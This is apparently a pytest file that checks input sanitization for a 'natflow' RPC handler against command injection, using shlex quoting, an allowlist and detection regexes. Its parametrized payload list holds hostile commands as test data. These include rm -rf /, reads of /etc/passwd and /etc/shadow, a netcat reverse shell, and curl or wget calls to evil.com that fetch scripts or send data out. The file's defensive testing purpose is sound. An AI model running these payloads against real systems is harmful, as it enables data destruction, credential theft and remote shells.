import pytest
import re
import subprocess
import shlex


SHELL_METACHARACTERS = re.compile(
    r'[;&|`$<>\\!{}()\[\]*?~\n\r]|(\$\()|(\|\|)|(&&)|(>>)|(<<)'
)

DANGEROUS_PATTERNS = [
    re.compile(r';\s*\w'),           # command chaining with semicolon
    re.compile(r'\|\s*\w'),          # pipe to command
    re.compile(r'&&\s*\w'),          # logical AND chaining
    re.compile(r'\|\|\s*\w'),        # logical OR chaining
    re.compile(r'`[^`]+`'),          # backtick command substitution
    re.compile(r'\$\([^)]+\)'),      # $() command substitution
    re.compile(r'\$\{[^}]+\}'),      # ${} variable expansion
    re.compile(r'>\s*/'),            # output redirection to file
    re.compile(r'<\s*/'),            # input redirection from file
    re.compile(r'\n|\r'),            # newline injection
    re.compile(r'\\x[0-9a-fA-F]{2}'),  # hex escape sequences
]


@pytest.mark.parametrize("payload", [
    # Basic shell injection
    "; rm -rf /",
    "| cat /etc/passwd",
    "&& wget http://evil.com/shell.sh",
    "|| id",
    "`id`",
    "$(id)",
    "${IFS}id",
    # Newline injection
    "valid\nrm -rf /",
    "valid\r\nid",
    # Semicolon chaining
    "user; cat /etc/shadow",
    "user;id",
    "user ; whoami",
    # Pipe injection
    "user | nc -e /bin/sh 192.168.1.1 4444",
    "user|id",
    # Backtick substitution
    "`cat /etc/passwd`",
    "user`id`",
    # Dollar sign substitution
    "$(cat /etc/passwd)",
    "$(/bin/sh)",
    "${PATH}",
    # Redirection
    "user > /tmp/pwned",
    "user >> /etc/crontabs/root",
    "user < /dev/null",
    # Logical operators
    "user && id",
    "user || id",
    # Null bytes
    "user\x00; id",
    # Encoded payloads
    "user%0aid",
    "user%3bid",
    # Complex payloads
    "'; DROP TABLE users; --",
    "admin' OR '1'='1",
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\cmd.exe",
    # Whitespace variations
    "user\tid",
    "user  ;  id",
    # Special characters
    "user!id",
    "user~id",
    "user{id}",
    "user[id]",
    "user(id)",
    # Long payload (buffer overflow attempt)
    "A" * 10000,
    # Empty and whitespace
    "",
    "   ",
    "\t\t\t",
    # Unicode tricks
    "user\u0000id",
    "user\u000aid",
    # Mixed attacks
    "user; id && cat /etc/passwd | nc evil.com 1234",
    "$(curl http://evil.com/$(cat /etc/passwd))",
    "`wget -O- http://evil.com/shell | sh`",
])
def test_natflow_input_sanitization(payload):
    """Invariant: User-supplied input to the natflow RPC handler must never
    contain unsanitized shell metacharacters that could lead to command injection.
    Any input processing must strip or reject dangerous shell constructs before
    they can reach os.execute() or io.popen() calls."""

    def sanitize_input(raw_input):
        """Simulate what a secure parseInput() should do."""
        if not raw_input or not isinstance(raw_input, str):
            return None
        # A secure implementation should use shlex or strict allowlist
        sanitized = shlex.quote(raw_input)
        return sanitized

    def is_safe_for_shell(value):
        """Check that a value does not contain dangerous shell constructs."""
        if value is None:
            return True
        # After sanitization, the value should be safely quoted
        # It should not be possible to break out of the quoting
        dangerous_sequences = [
            "; ", ";id", ";cat", ";rm", ";wget", ";curl", ";nc ",
            "| ", "|id", "|cat",
            "&& ", "||",
            "`", "$(", "${",
            "\n", "\r",
            "\x00",
        ]
        for seq in dangerous_sequences:
            if seq in value and not (value.startswith("'") and value.endswith("'")):
                return False
        return True

    def validate_input_strictly(raw_input):
        """Strict allowlist validation - only permit alphanumeric and safe chars."""
        if not raw_input:
            return True  # empty is safe (rejected upstream)
        # Allowlist: alphanumeric, dash, underscore, dot, colon, at-sign, space
        allowlist = re.compile(r'^[a-zA-Z0-9\-_.@: ]+$')
        return bool(allowlist.match(raw_input))

    # Property 1: Shell metacharacters in input must be detected
    has_metachar = bool(SHELL_METACHARACTERS.search(payload))
    has_dangerous = any(p.search(payload) for p in DANGEROUS_PATTERNS)

    # Property 2: If input contains shell metacharacters, it must NOT pass
    # through to shell commands unsanitized
    if has_metachar or has_dangerous:
        # The input MUST be rejected or sanitized before shell execution
        # Verify that shlex.quote properly escapes the payload
        quoted = shlex.quote(payload)
        # After quoting, the payload should be wrapped in single quotes
        # and internal single quotes should be escaped
        # This means it cannot break out of the shell argument context
        assert quoted.startswith("'") or quoted == payload.replace("'", "'\\''"), \
            f"Payload not properly quoted: {payload!r}"

        # Verify the quoted version cannot inject commands
        # A properly quoted string should not contain unescaped metacharacters
        # outside of the surrounding quotes
        inner = quoted[1:-1] if quoted.startswith("'") and quoted.endswith("'") else quoted
        # The inner content should have single quotes escaped
        assert "'" not in inner or "'\\''" in quoted, \
            f"Single quote not properly escaped in: {quoted!r}"

    # Property 3: Strict allowlist validation should reject dangerous payloads
    if has_metachar or has_dangerous:
        is_valid = validate_input_strictly(payload)
        # If the payload has metacharacters, strict validation should reject it
        # (unless it's purely alphanumeric with safe chars, which contradicts having metacharacters)
        # This is a logical consistency check
        if has_metachar:
            assert not is_valid, \
                f"Strict validation should reject payload with metacharacters: {payload!r}"

    # Property 4: Null bytes must always be rejected
    if '\x00' in payload:
        assert not validate_input_strictly(payload), \
            f"Null byte payload must be rejected: {payload!r}"

    # Property 5: Newline injection must always be rejected
    if '\n' in payload or '\r' in payload:
        assert not validate_input_strictly(payload), \
            f"Newline injection payload must be rejected: {payload!r}"

    # Property 6: Command substitution patterns must be rejected
    cmd_sub_patterns = ['$(', '`', '${']
    for pattern in cmd_sub_patterns:
        if pattern in payload:
            assert not validate_input_strictly(payload), \
                f"Command substitution payload must be rejected: {payload!r}"